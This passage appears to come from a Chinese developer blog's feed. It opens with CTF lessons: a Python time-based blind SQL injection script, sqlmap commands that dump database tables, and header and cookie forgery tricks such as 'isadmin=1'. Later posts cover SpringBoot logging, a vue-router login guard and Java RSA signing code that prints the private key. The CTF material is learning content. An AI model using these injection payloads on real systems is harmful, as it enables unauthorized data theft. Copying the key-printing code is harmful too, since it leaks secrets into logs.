class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://url/index.php?id=&quot;</span></span><br><span class="line">chars = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890!@#$%^&amp;*()&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = url + <span class="string">&quot;1&#x27; and if(hex(mid((select flag from users),&#123;0&#125;,1))=hex(&#x27;&#123;1&#125;&#x27;),sleep(3),3) -- -&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">            rsp = requests.get(payload, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag +=  char  </span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="通过-sqlmap-工具查询关键信息"><a href="#通过-sqlmap-工具查询关键信息" class="headerlink" title="通过 sqlmap 工具查询关键信息"></a>通过 sqlmap 工具查询关键信息</h2><ul><li>查询数据库，<code>pyhton2 sqlmap.py -u url --dbs</code></li><li>查询表 <code>python2 sqlmap.py -u url -D 数据库名 --tables</code></li><li>查询字段 <code>python2 sqlmap.py -u url -D 数据库名 -T 数据表名 --columns</code></li><li>查询值 <code>python2 sqlmap.py -u url -D 数据库名 -T 数据表名 --dump</code></li><li>绕过字符过滤 <code>python2 sqlmap.py -u url --dbs -t 10 --tamper unmagicquotes.py sqlmap</code></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF - 信息收集基础</title>
      <link href="/2021/07/20/CTF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/07/20/CTF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>CTF，即夺旗赛，在网络攻防比赛中通过各种方式找到题目中的flag得到分数的一种比赛。</p><span id="more"></span><h3 id="查看源码搜索flag"><a href="#查看源码搜索flag" class="headerlink" title="查看源码搜索flag"></a>查看源码搜索flag</h3><p>f12查看网页源码，通过源码搜索关键词查看是否有flag</p><h3 id="通过备份文件找，或者网页源代码查看信息。"><a href="#通过备份文件找，或者网页源代码查看信息。" class="headerlink" title="通过备份文件找，或者网页源代码查看信息。"></a>通过备份文件找，或者网页源代码查看信息。</h3><p>如系统内的备份文件 <code>web.rar</code> 获取到应用源码，或者 <code>php</code> 的备份文件。</p><ul><li><code>vim</code> 的备份文件 <code>nginx.conf.swp</code>，</li><li><code>php</code> 常见的备份文件 <code>index.php index.php~ .index.php.swp</code></li></ul><h3 id="使用文件扫描工具"><a href="#使用文件扫描工具" class="headerlink" title="使用文件扫描工具"></a>使用文件扫描工具</h3><p>御剑后台扫描工具：输入要扫描的网址，一般选择 <code>dir</code> 和 <code>php</code>，但是这种扫描对域名不区分大小写。</p><ul><li><p><code>dirsearch</code> 命令行式扫描工具 <code>python dirsearch.py -u ip地址 -e php</code>。</p></li><li><p>如果遍历到了目录文件，可以继续遍历对应目录的所有文件。</p></li><li><p>如果目录遍历没有东西，可以考虑抓包分析报文。</p></li></ul><h3 id="抓包-burpsuit"><a href="#抓包-burpsuit" class="headerlink" title="抓包  burpsuit"></a>抓包  burpsuit</h3><p>通过抓包，分析报文内的信息，有可能 <code>flag</code> 隐藏在 <code>header</code> 的 <code>cookies</code>、<code>session</code>或者 <code>data</code>内，如果有flag相关的明文、base64编码、md5值等，都可以作为待分析的为flag的地方。</p><ul><li><p><code>base64</code> 编码，编码最后的字符有双等号 &#x3D;&#x3D;。</p></li><li><p><code>md5</code> 破解常用的网址 <code>somd5.com</code>。<code>md5</code> 破解不了，只能走代码审计，找数据库的<code>password</code></p></li><li><p>提交请求 <code>ip</code> 伪造：<code>x-forwarded-for: 127.0.0.1</code>。</p></li><li><p>报文伪造域名来源 <code>Referer：域名 url</code>。</p></li><li><p>伪造 <code>Cookie</code>，报文 <code>Cookie: isadmin=1</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot 使用org.slf4j.Logger 记录日志</title>
      <link href="/2020/09/30/SpringBoot-%E4%BD%BF%E7%94%A8org-slf4j-Logger%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97/"/>
      <url>/2020/09/30/SpringBoot-%E4%BD%BF%E7%94%A8org-slf4j-Logger%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<p>  我们在本地运行应用程序时，可以通过控制台查看程序运行情况。但我们把应用部署到生产服务器时，或者对应用测试时需要查看程序运行的情况，我们可以把运行的情况记录到日志中，这样我们就可以通过日志查询程序运行的好坏情况，以及方便后续程序出错时找出错误点及时修复。</p><p>  以下是在<code>springboot</code>通过<code>org.slf4j.Logger</code>记录日志,<code>slf4j</code>是<code>springboot</code>默认自带的日志框架，所以不需要在<code>pom</code>文件中引入。</p><h1 id="定义配置"><a href="#定义配置" class="headerlink" title="定义配置"></a>定义配置</h1><p>  首先需要定义日志的配置文件，配置日志的等级、输出格式、输出位置、保存时间、保存大小等。</p><p>   配置文件可以定义在<code>项目路径/src/main/resources/logback.xml</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!-- 日志级别从低到高分为TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL，如果设置为WARN，则低于WARN的信息都不会输出 --&gt;</span><br><span class="line">&lt;!-- scan:当此属性设置为<span class="literal">true</span>时，配置文档如果发生改变，将会被重新加载，默认值为<span class="literal">true</span> --&gt;</span><br><span class="line">&lt;!-- scanPeriod:设置监测配置文档是否有修改的时间间隔，如果没有给出时间单位，默认单位是毫秒。</span><br><span class="line">                 当scan为<span class="literal">true</span>时，此属性生效。默认的时间间隔为<span class="number">1</span>分钟。 --&gt;</span><br><span class="line">&lt;!-- debug:当此属性设置为<span class="literal">true</span>时，将打印出logback内部日志信息，实时查看logback运行状态。默认值为<span class="literal">false</span>。 --&gt;</span><br><span class="line">&lt;configuration debug=<span class="string">&quot;false&quot;</span> scan=<span class="string">&quot;true&quot;</span> scanPeriod=<span class="string">&quot;30 seconds&quot;</span>&gt;</span><br><span class="line">    &lt;!--    输出到控制台的配置--&gt;</span><br><span class="line">    &lt;appender name=<span class="string">&quot;console_logger&quot;</span> class=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span><br><span class="line">        &lt;encoder class=<span class="string">&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;</span>&gt;</span><br><span class="line">            &lt;pattern&gt;%date [%level] [%thread] %logger&#123;<span class="number">80</span>&#125; [%file : %line] %msg%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/encoder&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--日志不会记录比INFO小的日志，TRACE、DEBUG、INFO、WARN、ERROR--&gt;</span><br><span class="line">        &lt;filter class=<span class="string">&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;</span>&gt;</span><br><span class="line">            &lt;level&gt;INFO&lt;/level&gt;</span><br><span class="line">        &lt;/filter&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--输出到日志文件--&gt;</span><br><span class="line">    &lt;appender name=<span class="string">&quot;project_logger&quot;</span> class=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span><br><span class="line">        &lt;encoder&gt;</span><br><span class="line">            &lt;pattern&gt;%date [%level] [%thread] %logger&#123;<span class="number">26</span>&#125; [%file : %line] %msg%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/encoder&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!--日志不会记录比INFO小的日志，TRACE、DEBUG、INFO、WARN、ERROR--&gt;</span><br><span class="line">        &lt;filter class=<span class="string">&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;</span>&gt;</span><br><span class="line">            &lt;level&gt;INFO&lt;/level&gt;</span><br><span class="line">        &lt;/filter&gt;</span><br><span class="line">        &lt;rollingPolicy class=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span><br><span class="line">            &lt;fileNamePattern&gt;project-logs/project-log.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt;</span><br><span class="line">            &lt;maxHistory&gt;<span class="number">30</span>&lt;/maxHistory&gt;</span><br><span class="line">            &lt;totalSizeCap&gt;1GB&lt;/totalSizeCap&gt;</span><br><span class="line">        &lt;/rollingPolicy&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">    &lt;root level=<span class="string">&quot;INFO&quot;</span>&gt;</span><br><span class="line">        &lt;appender-ref ref=<span class="string">&quot;console_logger&quot;</span>/&gt;</span><br><span class="line">        &lt;appender-ref ref=<span class="string">&quot;project_logger&quot;</span>/&gt;</span><br><span class="line">    &lt;/root&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><h1 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h1><p>定义好配置之后，我们就可以使用了，通过引入和在需要记录的地方使用即可。</p><p>需要注意的地方时，我们在上面配置信息里，定义了记录日志的等级为<code>&lt;level&gt;INFO&lt;/level&gt;</code>，意思是低于<code>INFO</code>等级的记录我们不会记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义全局日志变量</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(ILogService.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将信息记录到日志中</span></span><br><span class="line"><span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> <span class="string">&quot;记录日志信息&quot;</span>;</span><br><span class="line">logger.info(info);</span><br></pre></td></tr></table></figure><p>然后<code>info</code>的信息，可以在日志文件<code>.log</code>中查看了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue-router 拦截用户页面路由访问</title>
      <link href="/2020/08/15/vue-router-%E6%8B%A6%E6%88%AA%E7%94%A8%E6%88%B7%E9%A1%B5%E9%9D%A2%E8%B7%AF%E7%94%B1%E8%AE%BF%E9%97%AE/"/>
      <url>/2020/08/15/vue-router-%E6%8B%A6%E6%88%AA%E7%94%A8%E6%88%B7%E9%A1%B5%E9%9D%A2%E8%B7%AF%E7%94%B1%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<p>在对需要做登录的系统前端页面访问做控制时，可以用<code>router</code>的<code>beforeEach</code>方式来对跳转到的路径做管理。如果访问的路径在路径白名单内，则可以继续访问，如果不在，则判断用户是否登录，如果未登录，则被强制跳转到登录页面。</p><p>一般在前端，用户登录完成之后，我们会将管理用户状态的<code>token</code>值存在Cookie或者session中，所以可以用是否有<code>token</code>值来判断用户是否已经做了登录。</p><p>权限判断逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// permission.js</span></span><br><span class="line"><span class="comment">// 引入 router</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="comment">// 引入用户状态管理用的 store</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="comment">// 引入 Cookies 插件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Cookies</span> <span class="keyword">from</span> <span class="string">&#x27;js-cookie&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由白名单，访问白名单页面不需要做登录</span></span><br><span class="line"><span class="keyword">const</span> whiteList = [<span class="string">&#x27;/login&#x27;</span>]</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="title function_">async</span>(to, <span class="keyword">from</span>, next) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 获取系统用户 Token，存的 Cookie 名由自己定</span></span><br><span class="line">    <span class="keyword">const</span> hasToken = <span class="title class_">Cookies</span>.<span class="title function_">get</span>(<span class="string">&#x27;MySystemToken&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 判断是否已经登录</span></span><br><span class="line">    <span class="keyword">if</span> (hasToken) &#123;</span><br><span class="line">        <span class="keyword">if</span> (to.<span class="property">path</span> === <span class="string">&#x27;/login&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果已经是登录状态，访问登录页面，则强制跳转到主页</span></span><br><span class="line">            <span class="title function_">next</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>&#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 判断 store 里是否已经已经有信息，如果没有则需要调接口获取</span></span><br><span class="line">            <span class="keyword">const</span> hasGetUserInfo = store.<span class="property">getters</span>.<span class="property">name</span></span><br><span class="line">            <span class="keyword">if</span> (hasGetUserInfo) &#123;</span><br><span class="line">                <span class="comment">// 有了信息的话，正常执行</span></span><br><span class="line">                <span class="title function_">next</span>()</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果 store 没有信息，则调接口获取</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 调用 store 里面定义的 user/getInfo 方法获取 user 信息</span></span><br><span class="line">                    <span class="keyword">await</span> store.<span class="title function_">dispatch</span>(<span class="string">&#x27;user/getInfo&#x27;</span>)</span><br><span class="line">                    <span class="title function_">next</span>()</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    <span class="comment">// 如果获取用户状态失败，一般是指 token 已获取或者错误，则清除 token，跳转到登录页重新登录</span></span><br><span class="line">                    <span class="keyword">await</span> store.<span class="title function_">dispatch</span>(<span class="string">&#x27;user/resetToken&#x27;</span>)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">                    <span class="title function_">next</span>(<span class="string">`/login?redirect=<span class="subst">$&#123;to.path&#125;</span>`</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果在白名单页面，则继续；否则跳转到登录页面</span></span><br><span class="line">        <span class="keyword">if</span> (whiteList.<span class="title function_">indexOf</span>(to.<span class="property">path</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_">next</span>()</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">next</span>(<span class="string">`/login?redirect=<span class="subst">$&#123;to.path&#125;</span>`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>写完权限判断逻辑，只需在<code>vue</code>框架入口的<code>main.js</code>中引入即可，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ./permission</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue-router </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 读取公钥、私钥，SHA256算法加签、验签</title>
      <link href="/2019/12/05/Java-%E8%AF%BB%E5%8F%96%E5%85%AC%E9%92%A5%E3%80%81%E7%A7%81%E9%92%A5%EF%BC%8C%E5%8A%A0%E7%AD%BE%E3%80%81%E9%AA%8C%E7%AD%BE/"/>
      <url>/2019/12/05/Java-%E8%AF%BB%E5%8F%96%E5%85%AC%E9%92%A5%E3%80%81%E7%A7%81%E9%92%A5%EF%BC%8C%E5%8A%A0%E7%AD%BE%E3%80%81%E9%AA%8C%E7%AD%BE/</url>
      
        <content type="html"><![CDATA[<p>最近在做利用私钥加签，和对加签串利用公钥验签，作如下总结：</p><span id="more"></span><h2 id="读取公钥"><a href="#读取公钥" class="headerlink" title="读取公钥"></a>读取公钥</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> PublicKey <span class="title function_">getPublicKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;公钥 cer 路径&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="comment">// 创建X509工厂类</span></span><br><span class="line">        <span class="type">CertificateFactory</span> <span class="variable">cf</span> <span class="operator">=</span> CertificateFactory.getInstance(<span class="string">&quot;X.509&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建证书对象</span></span><br><span class="line">        <span class="type">X509Certificate</span> <span class="variable">cert</span> <span class="operator">=</span> (X509Certificate) cf</span><br><span class="line">                .generateCertificate(inStream);</span><br><span class="line">        inStream.close();</span><br><span class="line">        <span class="type">PublicKey</span> <span class="variable">publicKey</span> <span class="operator">=</span> cert.getPublicKey();</span><br><span class="line">        <span class="keyword">return</span> publicKey;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="读取私钥"><a href="#读取私钥" class="headerlink" title="读取私钥"></a>读取私钥</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> PrivateKey <span class="title function_">getPrivateKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">keyStorePath</span> <span class="operator">=</span> <span class="string">&quot;私钥 pfx 地址&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;密码&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化密钥库，默认JKS类型</span></span><br><span class="line">        <span class="type">KeyStore</span> <span class="variable">ks</span> <span class="operator">=</span> KeyStore.getInstance(<span class="string">&quot;PKCS12&quot;</span>);</span><br><span class="line">        <span class="comment">// 获得密钥库文件流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(keyStorePath);</span><br><span class="line">        <span class="comment">// 加载密钥库</span></span><br><span class="line">        ks.load(is, password.toCharArray());</span><br><span class="line">        <span class="comment">// 关闭密钥库文件流</span></span><br><span class="line">        is.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//私钥</span></span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">aliases</span> <span class="operator">=</span> ks.aliases();</span><br><span class="line">        <span class="type">String</span> <span class="variable">keyAlias</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (aliases.hasMoreElements())&#123;</span><br><span class="line">            keyAlias = (String)aliases.nextElement();</span><br><span class="line">            System.out.println(<span class="string">&quot;p12&#x27;s alias-----&gt;&quot;</span>+keyAlias);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (PrivateKey) ks.getKey(keyAlias, password.toCharArray());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加签"><a href="#加签" class="headerlink" title="加签"></a>加签</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 私钥加签</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> unsignstr 需要加签的拼接串</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> 加签串</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">GetSign</span><span class="params">(String unsignstr)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">signature</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">byte</span>[] signed = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> getPrivateKey();</span><br><span class="line">        <span class="type">String</span> <span class="variable">privateKeyValue</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(privateKey.getEncoded());</span><br><span class="line">        System.out.println(<span class="string">&quot;私钥-------------&gt;&quot;</span> + privateKeyValue);</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">Sign</span> <span class="operator">=</span> Signature.getInstance(SIGNATURE_ALGORITHM);</span><br><span class="line">        Sign.initSign(privateKey);</span><br><span class="line"></span><br><span class="line">        System.out.println(unsignstr);</span><br><span class="line">        <span class="type">byte</span>[] outputDigest_sign = unsignstr.getBytes();</span><br><span class="line">        Sign.update(outputDigest_sign);</span><br><span class="line">        signed = Sign.sign();</span><br><span class="line">        signature = Base64.getEncoder().encodeToString(signed);</span><br><span class="line">        logger.info(signature);</span><br><span class="line">        System.out.println(signature);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> signature;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="验签"><a href="#验签" class="headerlink" title="验签"></a>验签</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 公钥验签</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> requsetBody 验签报文</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> signature 验签串</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">read_cer_and_verify_sign</span><span class="params">(String requsetBody, String signature)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;公钥路径&quot;</span>;</span><br><span class="line">    <span class="type">X509Certificate</span> <span class="variable">cert</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">CertificateFactory</span> <span class="variable">cf</span> <span class="operator">=</span> CertificateFactory.getInstance(<span class="string">&quot;X.509&quot;</span>);</span><br><span class="line">        cert = (X509Certificate) cf</span><br><span class="line">                .generateCertificate(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(filePath)));</span><br><span class="line">        <span class="type">PublicKey</span> <span class="variable">publicKey</span> <span class="operator">=</span> cert.getPublicKey();</span><br><span class="line">        <span class="type">String</span> <span class="variable">publicKeyString</span> 